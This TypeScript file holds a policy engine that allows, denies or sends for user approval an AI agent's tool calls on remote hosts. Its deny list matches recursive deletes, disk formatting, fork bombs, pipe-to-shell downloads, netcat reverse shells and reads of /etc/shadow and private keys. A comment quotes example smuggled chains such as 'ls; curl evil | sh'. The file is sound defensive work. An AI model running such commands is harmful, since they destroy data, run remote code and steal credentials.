import type { AiVerdict } from '@shared/ipc'

/**
 * Pure decision engine for MCP agent tool calls. No I/O — given the request and
 * the user's config, returns a verdict. This is the security core; keep it
 * exhaustively tested and side-effect free.
 *
 * Invariants:
 *  - Read tools require the target host to be in the read allow-set.
 *  - Exec tools require the host in the exec allow-set AND (approval or a clean
 *    allowlist match). A built-in deny set is ALWAYS enforced and hard-rejects.
 */

export type ToolClass = 'read' | 'exec' | 'meta'

export interface PolicyConfig {
  approvalMode: 'always' | 'allowlist'
  /** Host ids the agent may read from. */
  readHostIds: readonly string[]
  /** Host ids the agent may run commands on. */
  execHostIds: readonly string[]
  /** Extra allow substrings for allowlist mode (matched case-insensitively). */
  allowPatterns: readonly string[]
}

export interface PolicyRequest {
  toolClass: ToolClass
  /** Target host id, when the tool acts on a host. */
  hostId?: string | null
  /** The command, for exec tools. */
  command?: string
}

export interface PolicyDecision {
  verdict: AiVerdict
  /** Human-readable reason, recorded in the audit log. */
  reason: string
}

/**
 * Always-denied command shapes (destructive or exfiltrating), enforced even in
 * allowlist mode. Defense-in-depth, not a complete sandbox — the approval gate
 * remains the primary control.
 */
const DENY_PATTERNS: ReadonlyArray<{ re: RegExp; why: string }> = [
  // Matches combined (`-rf`) AND split (`-r -f`, `-r --force`, `--recursive -f`)
  // flag spellings, in either order — `rm -r -f /` is the same command.
  {
    re: /\brm\s+(?:-[a-z-]+\s+|--[a-z-]+\s+)*(?:-[a-z]*r[a-z]*f|-[a-z]*f[a-z]*r)\b/i,
    why: 'recursive force delete',
  },
  {
    re: /\brm\b(?=[^\n]*(?:\s-[a-z]*r\b|\s--recursive\b))(?=[^\n]*(?:\s-[a-z]*f\b|\s--force\b))/i,
    why: 'recursive force delete',
  },
  { re: /\b(mkfs|fdisk|parted)\b/i, why: 'disk formatting' },
  { re: /\bdd\b[^\n]*\bof=\/dev\//i, why: 'raw write to a device' },
  { re: /:\(\)\s*\{.*:\|:.*&\s*\}\s*;\s*:/, why: 'fork bomb' },
  { re: /\b(curl|wget)\b[^\n|]*\|\s*(sudo\s+)?(ba)?sh\b/i, why: 'pipe-to-shell remote exec' },
  {
    re: /\bbase64\b[^\n|]*(-d|--decode)[^\n|]*\|\s*(sudo\s+)?(ba)?sh\b/i,
    why: 'base64-decode pipe-to-shell',
  },
  {
    re: /\bnc(at)?\b[^\n]*\s-[a-z]*e\b|\bncat\b[^\n]*--exec\b/i,
    why: 'netcat command execution (reverse shell)',
  },
  { re: /\/etc\/shadow\b/i, why: 'reads the shadow password file' },
  {
    re: /\bid_[a-z0-9]+\b|\.ssh\/[a-z0-9_]*id_|\bprivate[_-]?key\b/i,
    why: 'reads private key material',
  },
  { re: />\s*\/dev\/sd[a-z]\b/i, why: 'overwrites a block device' },
  { re: /\b(shutdown|reboot|halt|poweroff)\b/i, why: 'host power state change' },
]

/** First deny pattern a command matches, or null. */
export function matchDeny(command: string): string | null {
  for (const { re, why } of DENY_PATTERNS) {
    if (re.test(command)) return why
  }
  return null
}

/**
 * Shell metacharacters that introduce a second command, a redirect, or a
 * substitution. A command containing any of these is NEVER auto-allowed — it
 * falls through to user approval — so an allow pattern can't be abused to
 * smuggle extra commands past the gate (e.g. an `ls` pattern matching
 * `ls; curl evil | sh` or `ls && cat /etc/passwd`).
 */
const COMMAND_CHAINING_RE = /[;&|`$()<>\n\r]/

function matchesAllow(command: string, patterns: readonly string[]): boolean {
  if (COMMAND_CHAINING_RE.test(command)) return false
  const lower = command.trim().toLowerCase()
  // Anchor to the START of the command: an allow pattern must be a prefix
  // (the program plus leading args), not a substring appearing anywhere. A
  // bare substring match would auto-approve anything that merely contains the
  // pattern, defeating the gate.
  return patterns.some((p) => {
    const pat = p.trim().toLowerCase()
    if (pat === '') return false
    if (!lower.startsWith(pat)) return false
    // The prefix must also END on a token boundary. Without this, an allow entry
    // for `ip` silently auto-approves `iptables -F`, `ls` approves `lsblk`, and
    // `ps` approves `psql -c 'DROP …'` — the pattern the user typed is not the
    // program that runs. A trailing separator in the pattern itself (e.g.
    // `cat /var/log/`) already ends on one, hence the length check.
    const next = lower[pat.length]
    return next === undefined || /[\s/]/.test(next) || /[\s/]$/.test(pat)
  })
}

/** Decide whether a tool call is allowed, needs approval, or is denied. */
export function decide(req: PolicyRequest, cfg: PolicyConfig): PolicyDecision {
  // Meta/listing tools (list_hosts, read_ai_activity) are always allowed when
  // MCP is on; they expose no secrets and no host access.
  if (req.toolClass === 'meta') {
    return { verdict: 'allow', reason: 'metadata tool' }
  }

  if (req.toolClass === 'read') {
    if (!req.hostId || !cfg.readHostIds.includes(req.hostId)) {
      return { verdict: 'deny', reason: 'host not enabled for agent read access' }
    }
    return { verdict: 'allow', reason: 'host read-enabled' }
  }

  // exec
  if (!req.hostId || !cfg.execHostIds.includes(req.hostId)) {
    return { verdict: 'deny', reason: 'host not enabled for agent command execution' }
  }
  const command = req.command ?? ''
  const denyWhy = matchDeny(command)
  if (denyWhy) {
    return { verdict: 'deny', reason: `blocked: ${denyWhy}` }
  }
  if (cfg.approvalMode === 'allowlist' && matchesAllow(command, cfg.allowPatterns)) {
    return { verdict: 'allow', reason: 'matched an allow pattern' }
  }
  return { verdict: 'needs-approval', reason: 'exec requires user approval' }
}
